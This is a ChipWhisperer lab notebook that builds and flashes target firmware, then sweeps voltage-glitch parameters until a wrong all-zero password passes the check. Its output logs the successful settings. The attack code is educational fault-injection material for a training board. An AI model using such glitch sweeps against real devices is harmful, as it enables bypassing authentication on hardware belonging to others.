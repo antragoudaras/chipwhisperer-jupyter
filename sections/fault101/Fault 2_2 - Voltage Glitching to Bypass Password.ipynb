{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 2, Topic 2: Voltage Glitching to Bypass Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations, just like clock glitching. Let's continue on and see if it can also be used to break past a password check.*\n",
    "\n",
    "**LEARNING OUTCOMES:**\n",
    "\n",
    "* Applying previous glitch settings to new firmware\n",
    "* Checking for success and failure when glitching"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware\n",
    "\n",
    "Again, we've already covered this lab, so it'll be mostly up to you!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEXMEGA'\n",
    "SS_VER = 'SS_VER_1_1'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO: Found ChipWhisperer😍\n"
     ]
    }
   ],
   "source": [
    "%run \"../../Setup_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SS_VER set to SS_VER_1_1\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.hex\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.eep\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.cof\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.elf\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.map\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.sym\n",
      "rm -f -- simpleserial-glitch-CWLITEXMEGA.lss\n",
      "rm -f -- objdir-CWLITEXMEGA/*.o\n",
      "rm -f -- objdir-CWLITEXMEGA/*.lst\n",
      "rm -f -- simpleserial-glitch.s simpleserial.s XMEGA_AES_driver.s uart.s usart_driver.s xmega_hal.s\n",
      "rm -f -- simpleserial-glitch.d simpleserial.d XMEGA_AES_driver.d uart.d usart_driver.d xmega_hal.d\n",
      "rm -f -- simpleserial-glitch.i simpleserial.i XMEGA_AES_driver.i uart.i usart_driver.i xmega_hal.i\n",
      ".\n",
      "Welcome to another exciting ChipWhisperer target build!!\n",
      "avr-gcc (GCC) 5.4.0\n",
      "Copyright (C) 2015 Free Software Foundation, Inc.\n",
      "This is free software; see the source for copying conditions.  There is NO\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n",
      "\n",
      ".\n",
      "Compiling C: simpleserial-glitch.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/simpleserial-glitch.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch.o.d simpleserial-glitch.c -o objdir-CWLITEXMEGA/simpleserial-glitch.o\n",
      ".\n",
      "Compiling C: .././simpleserial/simpleserial.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir-CWLITEXMEGA/simpleserial.o\n",
      ".\n",
      "Compiling C: .././hal/xmega/XMEGA_AES_driver.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/XMEGA_AES_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/XMEGA_AES_driver.o.d .././hal/xmega/XMEGA_AES_driver.c -o objdir-CWLITEXMEGA/XMEGA_AES_driver.o\n",
      ".\n",
      "Compiling C: .././hal/xmega/uart.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/uart.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/uart.o.d .././hal/xmega/uart.c -o objdir-CWLITEXMEGA/uart.o\n",
      ".\n",
      "Compiling C: .././hal/xmega/usart_driver.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/usart_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/usart_driver.o.d .././hal/xmega/usart_driver.c -o objdir-CWLITEXMEGA/usart_driver.o\n",
      ".\n",
      "Compiling C: .././hal/xmega/xmega_hal.c\n",
      "avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/xmega_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/xmega_hal.o.d .././hal/xmega/xmega_hal.c -o objdir-CWLITEXMEGA/xmega_hal.o\n",
      ".\n",
      "Linking: simpleserial-glitch-CWLITEXMEGA.elf\n",
      "avr-gcc -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_1 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DF_CPU=7372800UL -DSS_VER_2_0=2 -DSS_VER_2_1=3 -DSS_VER_1_1=1 -DSS_VER_1_0=0 -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir-CWLITEXMEGA/simpleserial-glitch.o -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch-CWLITEXMEGA.elf.d objdir-CWLITEXMEGA/simpleserial-glitch.o objdir-CWLITEXMEGA/simpleserial.o objdir-CWLITEXMEGA/XMEGA_AES_driver.o objdir-CWLITEXMEGA/uart.o objdir-CWLITEXMEGA/usart_driver.o objdir-CWLITEXMEGA/xmega_hal.o --output simpleserial-glitch-CWLITEXMEGA.elf -Wl,-Map=simpleserial-glitch-CWLITEXMEGA.map,--cref   -lm  \n",
      ".\n",
      "Creating load file for Flash: simpleserial-glitch-CWLITEXMEGA.hex\n",
      "avr-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CWLITEXMEGA.elf simpleserial-glitch-CWLITEXMEGA.hex\n",
      ".\n",
      "Creating load file for EEPROM: simpleserial-glitch-CWLITEXMEGA.eep\n",
      "avr-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\n",
      "--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CWLITEXMEGA.elf simpleserial-glitch-CWLITEXMEGA.eep || exit 0\n",
      ".\n",
      "Creating Extended Listing: simpleserial-glitch-CWLITEXMEGA.lss\n",
      "avr-objdump -h -S -z simpleserial-glitch-CWLITEXMEGA.elf > simpleserial-glitch-CWLITEXMEGA.lss\n",
      ".\n",
      "Creating Symbol Table: simpleserial-glitch-CWLITEXMEGA.sym\n",
      "avr-nm -n simpleserial-glitch-CWLITEXMEGA.elf > simpleserial-glitch-CWLITEXMEGA.sym\n",
      "Size after:\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\n",
      "   2538\t     22\t     98\t   2658\t    a62\tsimpleserial-glitch-CWLITEXMEGA.elf\n",
      "+--------------------------------------------------------\n",
      "+ Default target does full rebuild each time.\n",
      "+ Specify buildtarget == allquick == to avoid full rebuild\n",
      "+--------------------------------------------------------\n",
      "+--------------------------------------------------------\n",
      "+ Built for platform CW-Lite XMEGA with:\n",
      "+ CRYPTO_TARGET = NONE\n",
      "+ CRYPTO_OPTIONS = \n",
      "+--------------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$SS_VER\"\n",
    "cd ../../../hardware/victims/firmware/simpleserial-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XMEGA Programming flash...\n",
      "XMEGA Reading flash...\n",
      "Verified flash OK, 2559 bytes\n"
     ]
    }
   ],
   "source": [
    "fw_path = \"../../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex\".format(PLATFORM)\n",
    "cw.program_target(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "if PLATFORM == \"CWLITEXMEGA\":\n",
    "    scope.clock.clkgen_freq = 32E6\n",
    "    if SS_VER=='SS_VER_2_0':\n",
    "        target.baud = 230400*32/7.37\n",
    "    else:\n",
    "        target.baud = 38400*32/7.37\n",
    "    def reboot_flush():            \n",
    "        scope.io.pdic = False\n",
    "        time.sleep(0.1)\n",
    "        scope.io.pdic = \"high_z\"\n",
    "        time.sleep(0.1)\n",
    "        #Flush garbage too\n",
    "        target.flush()\n",
    "else:\n",
    "    scope.clock.clkgen_freq = 24E6\n",
    "    if SS_VER=='SS_VER_2_0':\n",
    "        target.baud = 230400*24/7.37\n",
    "    else:\n",
    "        target.baud = 38400*24/7.37\n",
    "    time.sleep(0.1)\n",
    "    def reboot_flush():            \n",
    "        scope.io.nrst = False\n",
    "        time.sleep(0.05)\n",
    "        scope.io.nrst = \"high_z\"\n",
    "        time.sleep(0.05)\n",
    "        #Flush garbage too\n",
    "        target.flush()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n"
     ]
    }
   ],
   "source": [
    "#Do glitch loop\n",
    "reboot_flush()\n",
    "pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])\n",
    "target.simpleserial_write('p', pw)\n",
    "\n",
    "val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check\n",
    "valid = val['valid']\n",
    "if valid:\n",
    "    response = val['payload']\n",
    "    raw_serial = val['full_response']\n",
    "    error_code = val['rv']\n",
    "\n",
    "print(val)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.timeout = 0.1\n",
    "scope.glitch.clk_src = \"clkgen\" # set glitch input clock\n",
    "scope.glitch.output = \"glitch_only\" # glitch_out = glitch\n",
    "scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "if PLATFORM == \"CWLITEXMEGA\":\n",
    "    scope.io.glitch_lp = True\n",
    "    scope.io.glitch_hp = True\n",
    "elif PLATFORM == \"CWLITEARM\":\n",
    "    scope.io.glitch_lp = True\n",
    "    scope.io.glitch_hp = True\n",
    "elif PLATFORM == \"CW308_STM32F3\":\n",
    "    scope.io.glitch_hp = True\n",
    "    scope.io.glitch_lp = True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4fba0a3290eb48719d305ca61d8aa492",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='success count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "497f26bd3ec045cdbc9c3794c4733199",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='reset count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "22781dfce5044679a23264d605d9cf2e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='normal count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1795d6959df74bb8860efe5758ecbde6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "743a504e01b748149a2c634664be1375",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9fb35ff7060e4a6f882bd861085328fa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pylab as plt\n",
    "import chipwhisperer.common.results.glitch as glitch\n",
    "gc = glitch.GlitchController(groups=[\"success\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\", \"ext_offset\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 2.734375 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 2.734375 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 2.734375 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 2.734375 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 3.125 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 3.125 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 3.125 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 3.515625 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 3.515625 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 4.296875 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR:ChipWhisperer Target:Ack error: rRES\n",
      "ERROR:ChipWhisperer Target:Ack error: rRES\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 5.859375 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 6.25 5\n",
      "🐙{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\\n', 'rv': 0}\n",
      "CWbytearray(b'01')\n",
      "45.703125 6.25 5\n",
      "🐙Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n",
      "Trigger still high!\n"
     ]
    }
   ],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "g_step = 0.2\n",
    "\n",
    "# insert settings you found in the last part\n",
    "gc.set_range(\"width\", 45.7, 47.8)\n",
    "gc.set_range(\"offset\", 2.8, 10)\n",
    "gc.set_range(\"ext_offset\", 0, 15)\n",
    "scope.glitch.repeat = 5\n",
    "\n",
    "gc.set_global_step(g_step)\n",
    "\n",
    "scope.adc.timeout = 0.1\n",
    "\n",
    "reboot_flush()\n",
    "\n",
    "for glitch_settings in gc.glitch_values():\n",
    "    scope.glitch.offset = glitch_settings[1]\n",
    "    scope.glitch.width = glitch_settings[0]\n",
    "    scope.glitch.ext_offset = glitch_settings[2]\n",
    "    if scope.adc.state:\n",
    "        # can detect crash here (fast) before timing out (slow)\n",
    "        print(\"Trigger still high!\")\n",
    "        gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))\n",
    "        reboot_flush()\n",
    "\n",
    "    scope.arm()\n",
    "    target.simpleserial_write('p', bytearray([0]*5))\n",
    "    scope.io.glitch_hp = False\n",
    "    scope.io.glitch_hp = True\n",
    "    scope.io.glitch_lp = False\n",
    "    scope.io.glitch_lp = True\n",
    "    ret = scope.capture()\n",
    "\n",
    "    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check\n",
    "    if ret:\n",
    "        print('Timeout - no trigger')\n",
    "        gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))\n",
    "\n",
    "        #Device is slow to boot?\n",
    "        reboot_flush()\n",
    "\n",
    "    else:\n",
    "        if val['valid'] is False:\n",
    "            gc.add(\"reset\", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))\n",
    "            reboot_flush()\n",
    "        else:\n",
    "            if val['payload'] == bytearray([1]): #for loop check\n",
    "                gc.add(\"success\", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))\n",
    "                print(val)\n",
    "                print(val['payload'])\n",
    "                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)\n",
    "                print(\"🐙\", end=\"\")\n",
    "            else:\n",
    "                gc.add(\"normal\", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%matplotlib ipympl\n",
    "gc.results.plot_2d(plotdots={'success':'+g', 'reset':'xr', 'normal':None})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.glitch"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
